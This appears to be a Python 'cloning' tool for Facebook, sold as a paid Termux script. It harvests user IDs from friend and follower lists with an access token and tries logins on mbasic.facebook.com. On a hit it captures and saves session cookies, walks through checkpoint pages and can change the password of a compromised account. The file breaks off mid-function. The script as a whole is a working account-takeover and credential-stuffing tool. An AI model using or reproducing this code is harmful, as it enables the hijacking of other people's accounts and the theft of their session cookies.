#!/usr/bin/python3
#-*-coding:utf-8-*-
# Update V1.6

### Import Module
import requests as req
import requests as re
import time
import random
import json
import sys
import time
import datetime
import hashlib
import platform
import re
import threading
import urllib
import uuid
import ipaddress
import calendar
import requests
import mechanize
import bs4
import sys
import os
import subprocess
import random
import base64
import platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup

import os
import sys
try:
    import requests
except ModuleNotFoundError:
    print("Currently Installing Module requests")
    os.system("python -m pip install requests &> /dev/null")
try:
    import bs4
except ModuleNotFoundError:
    print("Currently Installing Module bs4")
    os.system("python -m pip install bs4 &> /dev/null")
try:
    import mechanize
except ModuleNotFoundError:
    print("Sedang Install Module mechanize")
    os.system("python -m pip install mechanize &> /dev/null")
try:
    import gTTS
except ModuleNotFoundError:
    os.system("python -m pip install gTTS &> /dev/null")

import requests as ress

try:
	print("[+] Checking Server IP ")
	time.sleep(3)
	rq = requests.get('https://github.com/ONUEGBE1/ZULU/blob/main/Approval.txt').text
except requests.exceptions.ConnectionError:
	exit('\n[+] Server Is Ofline Try Again later\n')
    

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.009)

from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as zthreads
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as profacc
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from requests.exceptions import ConnectionError
try:os.remove("old.txt")
except:pass
try:os.remove("oldv2.txt")
except:pass
try:
	os.mkdir('dump')
except:pass
try:
	os.mkdir('Hasil')
except:pass


## warna public
P = '\x1b[0;97m' 
M = '\x1b[0;91m' 
H = '\x1b[0;92m' 
K = '\x1b[0;93m' 
B = '\x1b[0;94m' 
U = '\x1b[0;95m' 
O = '\x1b[0;96m' 
N = '\x1b[0m'    
I='\x1b[0;32m'
C='\x1b[0;36m'
M='\x1b[0;31m'
U='\x1b[0;35m'
K='\x1b[0;33m'
P='\x1b[00m'
H='\x1b[0;90m'
Q="\x1b[00m"
i='\x1b[0;32m'
c='\x1b[0;36m'
m='\x1b[0;31m'
u='\x1b[0;35m'
k='\x1b[0;33m'
b='\x1b[0;34m'
p='\x1b[00m'
h='\x1b[0;90m'
q="\x1b[00m"
war = (Q+"["+C+"â€¢"+Q+"] ")
inp = (Q+"["+U+"-"+Q+"] ")
bulat = (Q+"["+C+"#"+Q+"] ")
panah2 = "\033[4;33mChoose\x1b[0m\n\033[1;91mâž¤\033[1;33mâž¤\033[1;32mâž¤\033[1;36mâž¤\x1b[0m "
garis = (war+"=====================================================")
def play_mpv(x):
	global alam
	try:
		if alam == "y" or "y" == alam:
			try:
				os.popen("play-audio "+x)
			except:pass
	except:pass
def pilih_alam():
	global alam
	pil_b = input(war+"Do you want to make a sound / alarm if the results of the crack come out? (Y/n) : ")
	if pil_b == "y" or pil_b == "Y":
		jalan(war+"If there is Mamang Garookx's voice, it's a sign that the crack results are out")
		jalan(war+"Example ...")
		alam = ("y")
		print(war+"if get OK")
		play_mpv('DING.mp3')
		time.sleep(2)
		print(war+"âœ“")
		print(war+"if get CP")
		play_mpv('bruh.mp3')
		time.sleep(2)
		print(war+"âœ“")
		return alam
	else:
		alam = ("Garoookkxxx")
		return alam				

def pilih_infong():
	global infoong
	pil_vv = input(war+"Do you want to show account information (Y/n) :")
	if pil_vv == "y" or pil_vv == "Y":
		infoong = ("y")
		return infoong
	else:
		infoong = ("Garoookkxxx")
		return infoong

from gtts import gTTS
def play_m(text):
	my_a = gTTS(text)
	my_a.save("hello.mp3")
	play_mpv('hello.mp3')		
logo2 = f"""\x1b[1;92m
   ________  __________  ______  _   __   _________    __  ___________  __
  / ____/\ \/ /_  __/ / / / __ \/ | / /  / ____/   |  /  |/  /  _/ /\ \/ /
 / /      \  / / / / /_/ / / / /  |/ /  / /_  / /| | / /|_/ // // /  \  / 
/ /___    / / / / / __  / /_/ / /|  /  / __/ / ___ |/ /  / // // /___/ /  
\____/   /_/ /_/ /_/ /_/\____/_/ |_/  /_/   /_/  |_/_/  /_/___/_____/_/    

\x1b[1;92m[âž¤âž¤âž¤âž¤]\x1b[1;92mCREATOR: CHIGOZIEWORLDWIDE [1;97m)
\033[41m\033[1;37m ðŸ‘¹ UNDEFEATED ðŸ‘¹ \033[41m\033[1;37m\x1b[0m
        
    \033[47m\033[1;37mCHIGOZIEWORLDWIDE[1;37m \x1b[0m\n"""
##########
#####approvel 
xox = platform.platform()[::-1].replace('.', '').replace('-', '').replace(' ', '').upper()
server = requests.get('https://github.com/ONUEGBE1/ZULU/blob/main/Approval.txt').text
def approv():
	os.system("clear")
	print(logo2)
	print(" ")
	print("[+] CHECKING APPROVAL ")
	if xox in server:
		print(" ")
	else:
		os.system("clear")
		print(logo2)
		print(" ")
		print("         \x1b[1;92m[+]  Your Subscription No Allow  [+] \033[1;97m")
		print("-----------------------------------------------------")
		print("\x1b[1;92mYour Token : "+xox)
		print(" ")
		print(" [+] Copy Your ID Send To OWNER ")
		print(" ")
		input(" [+] Enter ")
		os.system('xdg-open https://wa.me/+2348069472717')
		exit(' ')
approv()
kiky_at = ("KangProf")
######import sys, os, subprocess, platform, struct
#####if not struct.calcsize("P")*8==64:
######        exit(Q+"["+C+"!"+Q+"]"+K+" Sorry, this script doesn't support your cellphone")

null=open(os.devnull, "w")
insta= subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
null.close()
if insta !=0:
        os.system('pkg install play-audio -y &> /dev/null')						

logo2 = f"""\x1b[1;92m
   ________  __________  ______  _   __   _________    __  ___________  __
  / ____/\ \/ /_  __/ / / / __ \/ | / /  / ____/   |  /  |/  /  _/ /\ \/ /
 / /      \  / / / / /_/ / / / /  |/ /  / /_  / /| | / /|_/ // // /  \  / 
/ /___    / / / / / __  / /_/ / /|  /  / __/ / ___ |/ /  / // // /___/ /  
\____/   /_/ /_/ /_/ /_/\____/_/ |_/  /_/   /_/  |_/_/  /_/___/_____/_/    

\x1b[1;92m[âž¤âž¤âž¤âž¤]\x1b[1;92mCREATOR: CHIGOZIEWORLDWIDE(\x1b[1;924\x1b[1;97m)
\033[41m\033[1;37m ðŸ‘¹ UNDEFEATED ðŸ‘¹\033[41m\033[1;37m\x1b[0m
        
    \033[47m\033[1;37mCHIGOZIEWORLDWIDE \x1b[0m\n"""
###### 
CP = 0
OK = 0
TP = 0
loop = 0
loop = 0
jq = 0
bf = 0
bg = 0
jg = 0
pq = 0
kx = 0
Aman = 0
Cp = 0
Salah=0
ubahP = []
pwbaru = []
ok = []
cp = []
ttl = []
fw = []
id = []
lq = []
iz = []
opq = []
olq = []
data = {}
data2 = {}
mb = "https://mbasic.facebook.com"
url_mb = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
nampung = []
data,data2={},{}
ubahP,pwBaru=[],[]

###### 
current = datetime.now()
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
jamz = datetime.now().strftime('%H:%M:%S')
bulan_ttl = {"01": "January", "02": "FEBRUARY", "03": "MARCH", "04": "APRIL", "05": "MAY", "06": "JUNE", "07": "JULY", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

wwn = pilih([U, C, B, Q])

logo = f"""\x1b[1;92m
   ________  __________  ______  _   __   _________    __  ___________  __
  / ____/\ \/ /_  __/ / / / __ \/ | / /  / ____/   |  /  |/  /  _/ /\ \/ /
 / /      \  / / / / /_/ / / / /  |/ /  / /_  / /| | / /|_/ // // /  \  / 
/ /___    / / / / / __  / /_/ / /|  /  / __/ / ___ |/ /  / // // /___/ /  
\____/   /_/ /_/ /_/ /_/\____/_/ |_/  /_/   /_/  |_/_/  /_/___/_____/_/    

\x1b[1;92m[ðŸ”´ðŸ”´ðŸ”´ðŸ”´]\x1b[1;92mCREATOR: CHIGOZIEWORLDWIDE(\x1b[1;92\x1b[1;97m)
\x1b[1;92m[ðŸ”´ðŸ”´ðŸ”´ðŸ”´]\x1b[1;92mSTATUS: PREMIUM
\x1b[1;92m[ðŸ”´ðŸ”´ðŸ”´ðŸ”´]\x1b[1;92mPAID TOOL
\x1b[1;92m[ðŸ”´ðŸ”´ðŸ”´ðŸ”´]\x1b[1;92mVersion 5.0
\x1b[1;92m[ðŸ”´ðŸ”´ðŸ”´ðŸ”´]\x1b[1;92mThis Tool Is For Educational Purpose
\x1b[1;92m[ðŸ”´ðŸ”´ðŸ”´ðŸ”´]\x1b[1;92mWarning Don't Copy My Script
\033[41m\033[1;37mðŸ‘¹ UNDEFEATED ðŸ‘¹\033[41m\033[1;37m\x1b[0m
          
    \033[47m\033[1;37mCHIGOZIEWORLDWIDE [1;37\x1b[0m\n"""



try:
	ua = open(".ua","r").read()
except:
	print (war+'UPDATED VERSION 2022.')
	time.sleep(1)
	ua = pilih([
	"Mozilla/5.0 (Linux; Android 9; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"])
	ua1 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
		'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
		'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
		'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
	ua2 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
		'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
		'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
	pass
try:kiky_pass=requests.get("http://ip-api.com/json/").json()["country"].lower()
except:kiky_pass="None"

def menu():
	global ua
	os.system("clear")
	try:
		toket=open(".login.txt","r").read()
		token=open(".login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		try:
			nama = a["name"]
			gob = a["id"]
		except:
			nama = a["username"]
			gob = a["id"]
	except:
		print((war+" Token Invalid"))
		time.sleep(1)
		login()
	try:ip=requests.get("http://ip-api.com/json/").json()["query"]
	except:ip=("None")
	try:kiky=requests.get("http://ip-api.com/json/").json()["country"].lower()
	except:kiky=("None")
	try:kiky_kartu=requests.get("http://ip-api.com/json/").json()["isp"]
	except:kiky_kartu=("None")
	print (logo)
	visitor()   
	  
	url_main = "https://www.whatsmyua.info"
	s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
	raw_ua = s.find("li", id="rawUa").text
	family = s.find("li", id="family").text
	name_hp = s.find("li", id="product").text
	os_ = s.find("li", id="os").text
	ly = s.find("li", id="layout").text

	ua = raw_ua.replace("rawUa: ", "") # My Useragnet
	jenis_ua = family.replace("family: ", "")
	jenis_hp = name_hp.replace("product: ", "")
	jenis_os = os_.replace("os: ", "")
	jenis_ly = ly.replace("layout: ", "")	
	print(f"â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢")
	os.popen('play-audio selamat2.mp3')
	print(Q+"â”œâ”€["+C+"â€¢"+Q+"] Name    : "+K+nama)
	print(Q+"â”œâ”€["+C+"â€¢"+Q+"] ID      : "+K+gob)
	try:print(Q+"â”œâ”€["+C+"â€¢"+Q+"] Ip Addr : "+K+ip)
	except:pass
	print(f"{P}â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢")
	print(f" ")
	jalan("â”‚ OPTIONS â”‚")
	print(f" ")		
	print(" â€¢")
	print(" [%s01%s] CLONE From PUBIC"%(O,K))
	print(" [%s02%s] CLONE From FOLLOWERS"%(O,K))
	print(" [%s03%s] CLONE From FILES"%(O,K))	
	print(" [%s04%s] Options Detect"%(O,K))	
	print(" [%s05%s] Check Results "%(O,K))
	print(" [%s06%s]%s Logout%s "%(O,K,O,K))	
	print(" â€¢")
	ba=input(panah2)
	if ba in [""," "]:
		print(war+"Don't Empty Bro")
		time.sleep(2)
		menu()

	elif ba in ["1","01"]:
		dump_public()
		exit()

	elif ba in ["2","02"]:
		dump_follow()
		exit()

	elif ba in ["xZ","xz"]:
		check_kukis()
		global nama_grup
		_mmk_ = open('.cokie.txt').read()
		kueh  = {"cookie":_mmk_}
		kontol = input(f"{war}Masukan Idz Grups Sesad : ")
		if kontol in[""," "]:
			print('\n %s[%sÃ—%s] Don t Empty Bro !'%(N,M,N));time.sleep(2);moch_yayan()
		else:
			try:
				ajg=requests.get(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}",cookies=kueh).text
				agg=re.findall('\<span class\=\".*?\">(.*?)<\/span\>',ajg)[2]
				if "Halaman Tidak Ditemukan" in ajg:
					print(f"\n%s[%s!%s] Sorry Idz {kontol} This Group Is Not Published"%(N,M,N));time.sleep(2);menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("\n%s[%sX%s] Sorry The Cookies You Are Currently Using, Have Been Restricted"%(N,M,N));time.sleep(2);menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"\n%s[%sX%s] Sorry Idz {kontol} This Group Was Not Found !"%(N,M,N));time.sleep(2);menu()
				else:
					nama_grup = re.findall("\<title\>(.*?)<\/title\>",ajg)[0]
					nama_grup = nama_grup.replace(" ","-")
					jalan(war+"Dump Results Saved In : "+I+"dump/"+nama_grup+".json"+Q)
					print(war+"Name Groups : "+I+re.findall("\<title\>(.*?)<\/title\>",ajg)[0]+Q)
					print("\n"+war+"Press CTRL + C To Stop !!")
					crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}")
			except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit("\n"+war+"Sorry Your Network, Disconnect Because It's Weak")
		crackmenu("dump/"+nama_grup+".json").passmenu("dump/"+nama_grup+".json")
		exit("\n"+war+'Done !')
	elif ba in ["3","03"]:
		cekfile("dump")
		try:
			file = input(war+"Name File : ")
			crackmenu(file).passmenu(file)
			exit()
		except FileNotFoundError:
			exit(war+'File Not Found!!')

	elif ba in ["4","04"]:
#	 	buatngecek()  V 1
		cpdetect()
		exit()

	elif ba in ["5","05"]:
		rek()
		exit()

	elif ba in ["6","06"]:
		jalan(war+"Thank You For Using My Script !!!")
		os.system("rm -rf .login.txt")
		exit()
	else:
		print(war+'Fill it Correctly Bro')	  

def buat_laporan():
	from urllib.parse import quote
	jalan(war+"Halo Silahkan Isi Data Anda Dan Pesan Laporan (Masalah) Yang Terjadi")
	anu = input(war+"Nama Anda       : ")
	anun = input(war+"Pesan (Masalah) : ")
	load()
	jalan(war+"Sedang Membuat Text (Laporan) !!")
	url_wa = "https://api.whatsapp.com/send?phone=+2348069472717&text="
	tks = ("HELLO Admin CORE :)\nInfo : \nNama Pengirim : "+anu+"\n\nPesan (Laporan) : "+anun)
	subprocess.check_output(["am", "start", url_wa+quote(tks)])
anak_hakiki_ajg = "ANAK KONTOL, SAMA AJA MACAM HAKIKI"
def load():
	_ = ""
	__ = int("50")
	___ = int("0")
	for t in range(int("50")):
		_ += "="
		__ -= 1
		___ += 1
		print(("\r[+]%s>>> %s/%s"%(_,int(__),int(___))), end=' ');sys.stdout.flush()
		time.sleep(0.10)
	print("\n")

def pro1(file,lim,savefile,saveold,kntl):
    try:
        list_akun=open(file).read().splitlines()
        with ThreadPoolExecutor(max_workers=5) as su:
                try:
                        for akun in list_akun:
                                akn=akun.split("<=>")
                                try:
                                    su.submit(buat_,akn[0],savefile,saveold,kntl)
#                                    su.submit(dump_public,akn[0],lim,savefile,fila)
                                except (KeyboardInterrupt,EOFError):
                                    jalan(war+"Dump Stop !!");time.sleep(4);menu()
                except (KeyboardInterrupt,EOFError):
                    exit(jalan(war+"Dump Stop !!"))
    except (KeyError, IOError):
        exit(war+"File Not Found !!")	

def buat_(idt,save,saold,jaai):
	try:
		toket = open(".login.txt","r").read()
		token = open(".login.txt","r").read()
	except Exception as e:
		print((k+"["+p+"â€¢"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		logs()
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	try:
		qqq = ("dump/"+save+".json").replace(" ","_")
		yss = open(qqq , "a+")
		for i in z["data"]:
			uid = i['id']
			nm = i['name']
			nama = i['name']
			try:
				if len(uid) < 6:
					olj=open("dump/"+saold+".json", "a+")
#					olj=open("dump/Boke.txt", "a+")
					olj.write(uid+"<=>"+nama+"\n")
					print(uid)
					olq.append(uid+'<=>'+nm)
			except:pass
			try:
				oldd = uid.split("0000")
				old = (f"10000{oldd[1]}")
				olq.append(old+'<=>'+nm)
				olj=open("dump/"+saold+".json", "a+")
				olj.write(old+"<=>"+nama+"\n")
			except:pass
			try:
				try:
					neww = uid.split("10003")
					bja = (f"10003{neww[1]}")
				except:
					try:
						neww = uid.split("10004")
						bja = (f"10004{neww[1]}")
					except:
						try:
							neww = uid.split("10006")
							bja = (f"10006{neww[1]}")
						except:
							try:
								neww = uid.split("10007")
								bja = (f"10007{neww[1]}")
							except:pass
				opq.append(bja+'<=>'+nm)
				olqj=open("dump/"+jaai+".json", "a+")
				olqj.write(bja+"<=>"+nama+"\n")
			except:pass
			id.append(uid+"<=>"+na)
			yss.write(uid+"<=>"+na+"\n")
		yss.close()
	except KeyError:pass
	rr = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
	zz = json.loads(rr.text)
	try:
		qqq = ("dump/"+save+".json").replace(" ","_")
		dump = open(qqq , "a+")
		for ii in zz["data"]:
			uid = ii['id']
			nama = ii['name']
			nm = ii['name']
			try:
				if len(uid) < 6:
					olj=open("dump/"+saold+".json", "a+")
#					olj=open("dump/Boke.txt", "a+")
					olj.write(uid+"<=>"+nama+"\n")
					print(uid)
					olq.append(uid+'<=>'+nm)
			except:pass
			try:
				oldd = uid.split("0000")
				old = (f"10000{oldd[1]}")
				olq.append(old+'<=>'+nm)
				olj=open("dump/"+saold+".json", "a+")
				olj.write(old+"<=>"+nama+"\n")
			except:pass
			lq.append(uid+'<=>'+nm)
			dump.write(uid+'<=>'+nm+'\n')
		dump.close()
	except KeyError:pass
	try:
		tmen = ("%s"%(str(len(id))))
		epeq = ("%s"%(str(len(lq))))
		oldd = ("%s"%(str(len(olq))))
		nnew = ("%s"%(str(len(opq))))
		print((("\r[NEW : %s] + %s[%sOLD %s:%s%s]%s + %s[%sPUBLIC %s:%s%s] %s+ %s[%sFOLLOW %s:%s%s]"%(nnew,pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), oldd, pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), tmen, pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]),  pilih([H, M, U, I, Q, C]), epeq, pilih([H, M, U, I, Q, C])))), end=' ');sys.stdout.flush()
	except Exception as e:
		print((k+"["+p+"â€¢"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		pass

def rek():
#	cekfile("Hasil")
	cekfile_crk("Hasil")
	namax=input("\n"+inp+"Name File : ")
	try:
		fila=open(namax,"r").readlines()
	except FileNotFoundError:
		jalan(war+"Sorry File Not Found")
		rek()
	try:
		volak = namax.split("CP-")[1];copy_ri = ("CP");Ass = ("%s"%(K));aSs = K
	except:
		try:
			vok = namax.split("OK-")[1]
			copy_ri = ("OK")
			Ass = ("%s"%(I))
			aSs = I
		except:
			copy_ri = ("PROF-VECT")
			Ass = ("%s"%(C))
			aSs = M
	print(war+"Number of Accounts :",len(fila),"\n")
	with zthreads(max_workers=30) as (form):
		for data in fila:
			try:
				data = data.replace("\n","")
				try:user,pw,tll = data.split("|")
				except:user,pw = data.split("|");tll=(" - ")
				print(f"{Q}[{Ass}{copy_ri}{Q}] {aSs}{user}|{pw}|{tll}{Q}")
			except:pass
			time.sleep(0.01)
	input(war+'Press Enter !');time.sleep(3)
	menu()
def cpdetect():
	jalan(war+"Before continuing, please select the menu")
	print("\n[1] Check Option With File (multi)")
	print("[2] Check Option With File (user and pass)\n")
	babi = input(war+"Choose : ")
	if babi in ("1","01"):
		file_all()
		exit()
	elif babi in ("2","02"):
		manual()
		exit()
	else:
		jalan(war+"Fill Correctly Bro");time.sleep(4)
		cpdetect()
def manual():
	global user,pw,pwBar,ubahP,jarak
	jarak = ""
	ww=input(war+"Do You Want to Change Password, Account Tap Yes (y/n): ")
	if ww in ("Y","y"):
		ubahP.append("y")
		pwBar=input(war+"New Password To Tap Yes : ")
		if len(pwBar) <= 5:
			exit(jalan(war+"Password minimum 6 letter"))
		else:
			pwBaru.append(pwBar)
	else:pass
	user = input(war+"Username/Email/Idz : ")
	pw = input(war+"Password : ")
	cek_opsi(user, pw)
	input(war+"Back To Menu")
	menu()

def file_all():
	cekfile("Hasil")
	namax=input("\n"+inp+"Name File : ")
	try:
		fila=open(namax,"r").readlines()
	except FileNotFoundError:
		jalan(war+"Sorry File Not Found")
		cpdetect()
#	file_cepat(fila)
	file_lambat(fila)
url = "https://mbasic.facebook.com"
jarak = ""
def file_cepat(file):
	global user,pw,pwBar,ubahP,jarak
	jarak = ""
	ww=input(war+"Do You Want to Change Password, Account Tap Yes (y/n): ")
	if ww in ("Y","y"):
		ubahP.append("y")
		pwBar=input(war+"New Password To Tap Yes : ")
		if len(pwBar) <= 5:
			exit(jalan(war+"Password minimum 6 letter"))
		else:
			pwBaru.append(pwBar)
	else:pass
	print(war+"Number of Accounts :",len(file),"\n")
	with zthreads(max_workers=5) as (form):
		for data in file:
			try:
				data = data.replace("\n","")
				try:
					dat, data = data.split("TAP ")
				except:pass
				try:user,pw,tll = data.split("|")
				except:user,pw = data.split("|");tll=(" - ")
				user = user
				pw = pw
				ttl = tll
#				print(f"{war}{user}|{pw}|{ttl}")
				try:
					form.submit(log_hasil, user, pw)
				except:continue
			except:continue
def file_lambat(file):
	global user,pw,pwBar,ubahP,jarak,aman,cp,salah,bz
	bz = 0
	jarak = ""
	ww=input(war+"Do You Want to Change Password, Account Tap Yes (y/n): ")
	if ww in ("Y","y"):
		ubahP.append("y")
		pwBar=input(war+"New Password To Tap Yes : ")
		if len(pwBar) <= 5:
			exit(jalan(war+"Password minimum 6 letter"))
		else:
			pwBaru.append(pwBar)
	else:pass
	print(war+"Number of Accounts :",len(file),"\n")
	for data in file:
		try:
			data = data.replace("\n","")
			data = data.replace("TAP ","")
			data = data.replace(" [AZIM-CP] ","")
			data = data.replace(" [Ã—] ","")
			try:user,pww,tll = data.split("|")
			except:user,pww = data.split("|");tll=(" - ")
			user = user
			try:
				pww = pww.split("['")[1]
				pww = pww.split("']")[0]
				pw = pww
			except:
				pw = pww
			ttl = tll
			cek_opsi(user, pw)
		except Exception as e:print("\n[!] Error : %s"%(e));continue	

def exceptv1(userq, pwq):
	try:
		cek_opsi(userq, pwq)
	except requests.exceptions.ConnectionError:
		return exceptv1(userq, pwq)
	except:
		return exceptv1(userq, pwq)
def tanya_opsi():
	global opsii
	anjag = input(war+"Do you want to show account options (y/n) : ")
	if anjag in ["1","Yes","ya","y","Y","Ya"]:
		opsii = "y"
	else:
		opsii = ("Risky_Gtg")
def buat_gab():
	global pwBar,ubahP,jarak
	jarak = ""
	ww=input(war+"Do You Want to Change Password, Account Tap Yes (y/n): ")
	if ww in ("Y","y"):
		ubahP.append("y")
		pwBar=input(war+"New Password To Tap Yes : ")
		if len(pwBar) <= 5:
			exit(jalan(war+"Password minimum 6 letter"))
		else:
			pwBaru.append(pwBar)
	else:
		print(war+"Skip Tap Yes")
def sttt(userr, pww, tta):
	global user,pw,ttl
	try:
		user = userr
		pw = pww
		ttl = tta
		cek_opsi_crack(user, pw, tll)
	except:pass

#########################
# Terima Kasih To Latip #          <<< KNTL
#########################
def cek_opsi(user, pw):
#	global aman,cp,salah
	global url,bz
	bz += 1
	url = "https://mbasic.facebook.com"
	session=req.Session()
	session.headers.update({
		"Host":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://mbasic.facebook.com/",
		"user-agent":"Mozilla/5.0 (Linux; Android 9; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36;]"
	})
	soup=par(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
	response=par(urlPost.text, "html.parser")
	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
		print(war+"Hidup Matikan Mode Pesawat, Selama 2 Detik !!")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print(f"\r{Q}[{C}{str(bz)}{Q}] Sedang Check Opsi Akun : {K}{user}|{pw}{Q}		\n",end="")
			print(f"\r{jarak}{war}Akun Ini Kenak Sesi New					\n\n",end="")
		else:
#			aman+=1
			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
			print(f"\r{Q}[{I}OK{Q}]{I} {user}|{pw}{Q}        \n",end="")
			print(f"\r{jarak}{Q}[{I}âœ“{Q}]{C} Cookie: {I}{coki}{Q}\n",end="")
			open("Hasil/Akun-Tap-Yes.txt", "a").write(user+"|"+pw+"|"+coki+"\n")
			get_infoo(session,coki)
			cek_apk(session,coki)
	elif "checkpoint" in session.cookies.get_dict():
#		cp+=1
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=par(an.text,"html.parser")
		number=0
		cek=[cek for cek in response2.find_all("option")]
		print(f"\r{Q}[{C}{str(bz)}{Q}] Sedang Check Opsi Akun : {K} {user}|{pw}{Q}		\n",end="")
#		print(f"\r\33[1;33m[CP] {user} | {pw}								\33[37;1m\n",end="")
		print(f"\r{Q}[{M}!{Q}] Terdapat {K}{len(cek)}{Q} Opsi :	\n",end="")
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				if "y" in ubahP:
					ubah_pw(session,response,link2)
				else:
					print(f"\r{jarak}{Q}[{I}âˆš{Q}]{I} Selamat Akun Ini Tap Yes {Q}\n{jarak}[{C}+{Q}]{Q} Cookie: {I}{coki}{Q}\n")
					cek_apk(session,coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print(f"\r{jarak}{Q}[{M}Ã—{P}] {M}Akun A2F On            {Q}\n")
			else:
				print(f"\r{jarak}{war}{M}Terjadi Masalah Terhadap Akun{Q}     		\n")
		elif(len(cek)<=1):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
				print(f"\r{jarak}{Q}[{C}{number}{Q}] {K}{''.join(opsi)}			{Q}\n",end="")
			print("")
		elif(len(cek)>=2):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
				print(f"\r{jarak}{Q}[{C}{number}{Q}] {K}{''.join(opsi)}			{Q}\n",end="")
			print("")
		else:
			if "c_user" in session.cookies.get_dict():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print(f"\r{Q}[{I}OK{Q}] {I}{user}|{pw}|{coki}{Q}        \n",end="")
				open("Hasil/Akun-Tap-Yes.txt", "a").write(user+"|"+pw+"|"+coki+"\n")
				get_infoo(session,coki)
				cek_apk(session,coki)
				
	else:
#		salah+=1
